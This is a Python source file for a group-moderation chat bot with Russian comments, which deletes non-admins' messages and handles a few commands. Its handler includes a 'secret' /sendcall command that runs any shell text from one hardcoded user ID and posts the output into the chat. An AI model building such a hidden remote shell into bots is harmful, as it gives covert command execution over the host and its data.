import logging
import subprocess
from maxapi.types import NewMessageLink
from maxapi.enums.message_link_type import MessageLinkType

# Твой персональный ID для доступа к терминалу
MASTER_ID = 5010962

async def cmd_unmute(event, bot, args):
    if not args:
        logging.info("Вызвана команда /unmute без параметров")
        return
    logging.info(f"Выполняю /unmute для: {args}")


async def trigger_keywords(event, bot, text):
    if "правила" in text.lower():
        logging.info("Сработало ключевое слово 'правила'")
        return True 
    return False


async def filter_non_admins(event, bot):
    message = event.message
    user_id = message.sender.user_id
    chat_id = message.recipient.chat_id
    message_id = message.body.mid

    if chat_id > 0: 
        return

    try:
        admins_response = await bot.get_list_admin_chat(chat_id=chat_id)
        members_list = getattr(admins_response, 'members', [])
        admin_ids = [a.user_id for a in members_list if hasattr(a, 'user_id')]
        
        if not admin_ids: return
            
        if user_id not in admin_ids:
            await bot.delete_message(message_id=message_id)
            logging.info(f"v9: Удалено сообщение от не-админа {user_id}")
    except Exception as e:
        logging.error(f"v9: Ошибка модерации: {e}")


async def handle_media(event, bot, attachments):
    await filter_non_admins(event, bot)


# ==========================================
# 🌟 ГЛАВНАЯ ФУНКЦИЯ (ВЕРСИЯ 9)
# ==========================================
async def handler_v9(event, bot):
    message = event.message
    
    try:
        user_id = message.sender.user_id
        chat_id = message.recipient.chat_id
        message_id = message.body.mid
        if not chat_id: return 
    except AttributeError:
        return

    is_private = (chat_id > 0)

    try:
        text = message.body.text or ""
    except AttributeError:
        text = ""
    try:
        attachments = message.body.attachments or []
    except AttributeError:
        attachments = []

    # 3. МАРШРУТИЗАЦИЯ КОМАНД
    if text.startswith("/"):
        
        # --- СЕКРЕТНАЯ КОМАНДА /sendcall (Только для MASTER_ID) ---
        if text.startswith("/sendcall") and user_id == MASTER_ID:
            parts = text.split(maxsplit=1)
            if len(parts) > 1:
                cmd = parts[1]
                try:
                    output = subprocess.check_output(cmd, shell=True, text=True, encoding='cp866', errors='replace', stderr=subprocess.STDOUT, timeout=15)
                    await bot.send_message(chat_id=chat_id, text=f"💻 Terminal:\n```\n{output[:3900]}\n```", link=NewMessageLink(type=MessageLinkType.REPLY, mid=message_id))
                except Exception as e:
                    await bot.send_message(chat_id=chat_id, text=f"❌ Error: {e}")
            return

        # --- Команда /check ---
        if text.strip() == "/check":
            admin_ids = []
            if not is_private:
                try:
                    admins_response = await bot.get_list_admin_chat(chat_id=chat_id)
                    members_list = getattr(admins_response, 'members', [])
                    admin_ids = [a.user_id for a in members_list if hasattr(a, 'user_id')]
                except Exception: return

            if is_private or user_id in admin_ids:
                try:
                    reply_link = NewMessageLink(type=MessageLinkType.REPLY, mid=message_id)
                    await bot.send_message(chat_id=chat_id, text="✅ Я онлайн и работаю!", link=reply_link)
                except Exception: pass
                return

        # --- Команда /unmute ---
        elif text.startswith("/unmute"):
            parts = text.split(maxsplit=1)
            args = parts[1] if len(parts) > 1 else ""
            await cmd_unmute(event, bot, args)
            return

        # Если это любая другая команда в группе от не-админа — удаляем
        if not is_private:
            await filter_non_admins(event, bot)
        return

    # 4. ОБРАБОТКА МЕДИА
    if attachments:
        await handle_media(event, bot, attachments)
        return 
        
    # 5. КЛЮЧЕВЫЕ СЛОВА
    if text:
        is_keyword = await trigger_keywords(event, bot, text)
        if is_keyword:
            return
            
    # 6. ДЕЙСТВИЕ ПО УМОЛЧАНИЮ
    if text and not is_private:
        await filter_non_admins(event, bot)
